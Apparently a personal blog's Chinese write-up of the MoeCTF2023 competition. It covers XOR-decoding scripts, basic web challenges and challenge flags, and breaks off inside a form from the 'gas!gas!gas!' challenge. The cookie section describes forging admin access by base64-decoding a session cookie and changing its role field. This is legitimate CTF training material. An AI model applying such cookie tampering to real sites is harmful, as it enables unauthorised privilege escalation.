
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>MoeCTF2023 | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">2.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Basic"><span class="toc-number">3.</span> <span class="toc-text">Basic</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CCCCC"><span class="toc-number">3.1.</span> <span class="toc-text">CCCCC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python"><span class="toc-number">3.2.</span> <span class="toc-text">Python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#runme"><span class="toc-number">3.3.</span> <span class="toc-text">runme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#runme2"><span class="toc-number">3.4.</span> <span class="toc-text">runme2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">4.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#http"><span class="toc-number">4.1.</span> <span class="toc-text">http</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-number">4.2.</span> <span class="toc-text">Web入门指北</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cookie"><span class="toc-number">4.3.</span> <span class="toc-text">cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%BC%E5%B2%B8%E7%9A%84flag"><span class="toc-number">4.4.</span> <span class="toc-text">彼岸的flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gas-gas-gas"><span class="toc-number">4.5.</span> <span class="toc-text">gas!gas!gas!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#moe%E5%9B%BE%E5%BA%8A"><span class="toc-number">4.6.</span> <span class="toc-text">moe图床</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3%E4%BD%A0%E7%9A%84%E5%BA%A7%E9%A9%BE"><span class="toc-number">4.7.</span> <span class="toc-text">了解你的座驾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E6%B5%B7%E6%8D%9E%E9%92%88"><span class="toc-number">4.8.</span> <span class="toc-text">大海捞针</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#meo%E5%9B%BE%E5%BA%8A"><span class="toc-number">4.9.</span> <span class="toc-text">meo图床</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%BA%E5%91%BD%E5%8D%81%E4%B8%89%E6%9E%AA"><span class="toc-number">4.10.</span> <span class="toc-text">夺命十三枪</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#signin"><span class="toc-number">4.11.</span> <span class="toc-text">signin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BA%E5%8E%BB%E6%97%85%E6%B8%B8%E7%9A%84%E5%BF%83%E6%B5%B7"><span class="toc-number">4.12.</span> <span class="toc-text">出去旅游的心海</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#moeworld"><span class="toc-number">4.13.</span> <span class="toc-text">moeworld</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E9%83%A8%E5%88%86"><span class="toc-number">4.13.1.</span> <span class="toc-text">外网部分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E9%83%A8%E5%88%86-%E6%9C%AA%E5%AE%8C%E6%88%90"><span class="toc-number">4.13.2.</span> <span class="toc-text">内网部分(未完成)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Jail"><span class="toc-number">5.</span> <span class="toc-text">Jail</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Jail-Level-0"><span class="toc-number">5.1.</span> <span class="toc-text">Jail Level 0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jail-Level-1"><span class="toc-number">5.2.</span> <span class="toc-text">Jail Level 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jail-Level-2"><span class="toc-number">5.3.</span> <span class="toc-text">Jail Level 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jail-Level-3"><span class="toc-number">5.4.</span> <span class="toc-text">Jail Level 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jail-Level-4"><span class="toc-number">5.5.</span> <span class="toc-text">Jail Level 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jail-Level-5%EF%BC%88%E6%9C%AA%E5%AE%8C%E6%88%90%EF%BC%89"><span class="toc-number">5.6.</span> <span class="toc-text">Jail Level 5（未完成）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Leak-Level-0"><span class="toc-number">5.7.</span> <span class="toc-text">Leak Level 0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Leak-Level-1"><span class="toc-number">5.8.</span> <span class="toc-text">Leak Level 1</span></a></li></ol></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>MoeCTF2023</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/8/15
        </span>
        
        <span class="category">
            <a href="/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                CTF线上赛
            </a>
        </span>
        
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">6.7k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">34分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><del>学了一年的fw老东西狠狠地摸，顺便尝试尝试新方向</del></p>
<p>结果差点忘了这个的结束日期，最后只打了web（12.5&#x2F;13）和jail</p>
<span id="more"></span>

<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>直接复制网址即可得到flag：<code>moectf&#123;We1com3_t0_m0ectf_2o23!!!&#125;</code></p>
<hr>
<h1 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h1><h2 id="CCCCC"><a href="#CCCCC" class="headerlink" title="CCCCC"></a>CCCCC</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token comment">//unsigned char flag[]="moectf&#123;HAHA_C_1s_easy!&#125;";</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> enc_data<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"mng`pc&#125;OIAKTOR?|Ots`m4k"</span><span class="token punctuation">,</span>flag<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span>enc_data<span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>enc_data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>i<span class="token punctuation">;</span>	<span class="token comment">// 按位异或</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">156</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">149</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">163</span><span class="token punctuation">,</span> <span class="token number">138</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">172</span><span class="token punctuation">,</span> <span class="token number">194</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">172</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">,</span> <span class="token number">172</span><span class="token punctuation">,</span> <span class="token number">148</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">151</span><span class="token punctuation">,</span> <span class="token number">172</span><span class="token punctuation">,</span> <span class="token number">149</span><span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">,</span> <span class="token number">154</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">151</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">142</span><span class="token punctuation">]</span>	<span class="token comment"># Ascii值</span>
x<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span>x<span class="token operator">^</span><span class="token number">0xff</span>	<span class="token comment"># 匿名方法：与0xff进行异或</span>
enc2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> enc1<span class="token punctuation">:</span>
  enc2<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>	<span class="token comment"># 进行异或</span>
key<span class="token operator">=</span><span class="token string">"moectf2023"</span>
flag<span class="token operator">=</span><span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0xf3</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>enc2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token punctuation">(</span>enc2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xc</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><p><code>(0xf3) &amp; (enc2[i])</code> 对解密后的值与 <code>0xf3</code> 进行按位与运算，保留某些特定位的值。</p>
</li>
<li><p><code>((enc2[i]) ^ 0xff) &amp; 0xc</code> 对解密后的值取反后，再与 <code>0xc</code> 进行按位与运算，保留某些特定位的值。</p>
</li>
<li><p><code>((0xf3) &amp; (enc2[i])) | (((enc2[i]) ^ 0xff) &amp; 0xc)</code> 将上述两个结果进行按位或运算，得到最终的值。</p>
</li>
<li><p><code>chr()</code> 函数将最终的值转换为对应的字符。</p>
</li>
<li><p><code>flag +=</code> 用于将转换后的字符追加到 <code>flag</code> 字符串中。</p>
</li>
</ul>
<p>运行得到flag：<code>moectf&#123;Pyth0n_1z_0ur_g00d_friendz&#125;</code></p>
<h2 id="runme"><a href="#runme" class="headerlink" title="runme"></a>runme</h2><p>在对应的文件夹下打开cmd，输入程序名字即可执行保留结果</p>
<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231011232248537.png" alt="image-20231011232248537"></p>
<hr>
<h2 id="runme2"><a href="#runme2" class="headerlink" title="runme2"></a>runme2</h2><p>整个linux系统（虚拟机或者wsl），打开终端</p>
<p>先给个执行权限，然后就可以运行了</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x ./runme2
./runme2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231011232933438.png" alt="image-20231011232933438"></p>
<hr>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>照着提示做就行</p>
<p><img src="/blog/2023/08/15/MoeCTF2023/image-20230815162736784.png" alt="image-20230815162736784"></p>
<p>flag：</p>
<p><code>moectf&#123;basic_http_knowledge_Ak86CvfMV31YLT7ih6U_UoJDZKVa3UFX&#125;</code></p>
<hr>
<h2 id="Web入门指北"><a href="#Web入门指北" class="headerlink" title="Web入门指北"></a>Web入门指北</h2><p>十六进制+base64</p>
<p>flag：</p>
<p><code>moectf&#123;w3lCome_To_moeCTF_W2b_challengE!!&#125;</code></p>
<hr>
<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>下载附件，得到api接口</p>
<p>进入题目，先访问&#x2F;flag这个api看看，返回了<code>&quot;flag&#123;you_should_login_first_to_get_the_flag&#125;&quot;</code></p>
<p>也就是我们要先登录才能拿到flag</p>
<p>访问&#x2F;register抓包一手，按readme文档里面的json格式post发包进行注册</p>
<p><img src="/blog/2023/08/15/MoeCTF2023/image-20230816181759307.png" alt="image-20230816181759307"></p>
<p>注意Content-type要改为json</p>
<p>然后访问&#x2F;login</p>
<p><img src="/blog/2023/08/15/MoeCTF2023/image-20230816181913414.png" alt="image-20230816181913414"></p>
<p>得到我们需要的cookie值</p>
<p>带着这个cookie值去&#x2F;flag</p>
<p><img src="/blog/2023/08/15/MoeCTF2023/image-20230816182242033.png" alt="image-20230816182242033"></p>
<p>返回<code>flag&#123;sorry_but_you_are_not_admin&#125;</code>，说明我们要以管理员登录才能获得flag</p>
<p>照上面的流程注册一个admin的账号</p>
<p>然后会发现账号已存在，这个时候我们先把cookie拿出来解码看看</p>
<p><img src="/blog/2023/08/15/MoeCTF2023/image-20230816183308088.png" alt="image-20230816183308088"></p>
<p>发现base64解码后能得到一串json</p>
<p>猜测就是靠这个判断是否是admin的，那我们只要把<code>&quot;role&quot;: &quot;user&quot;</code>改成<code>&quot;role&quot;: &quot;admin&quot;</code>再base64编码回去即可</p>
<p><img src="/blog/2023/08/15/MoeCTF2023/image-20230816183541838.png" alt="image-20230816183541838"></p>
<p><img src="/blog/2023/08/15/MoeCTF2023/image-20230816183523683.png" alt="image-20230816183523683"></p>
<p>flag：</p>
<p><code>moectf&#123;cooKi3_is_d3licious_MA9iVff90SSJ!!M6Mrfu9ifxi9i!JGofMJ36D9cPMxro&#125;</code></p>
<hr>
<h2 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h2><p>连接容器，发现给了我个本地localhost页面</p>
<p>是一个聊天记录页面，结合题目描述说的在聊天平台泄露了flag</p>
<p>直接ctrl+u查看页面html源码</p>
<p><img src="/blog/2023/08/15/MoeCTF2023/image-20230817215227426.png" alt="image-20230817215227426"></p>
<p>找到flag</p>
<p><code>moectf&#123;find_comments_X7rT9Wp4oxhbmrS25ESL1RTnbXGcfrfU&#125;</code></p>
<hr>
<h2 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h2><blockquote>
<p>python脚本</p>
</blockquote>
<p>要求0.5s就得做出反应，要么是伪造session要么是脚本代跑</p>
<p>f12在前端中找到对应的id属性</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>driver<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>选手:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>driver<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>driver<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>steering_control<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>方向控制:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>steering_control<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>steering_control<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>左<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">selected</span><span class="token punctuation">></span></span>直行<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>右<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>throttle<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>油门控制:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>throttle<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>throttle<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>松开<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>保持<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span> <span class="token attr-name">selected</span><span class="token punctuation">></span></span>全开<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>
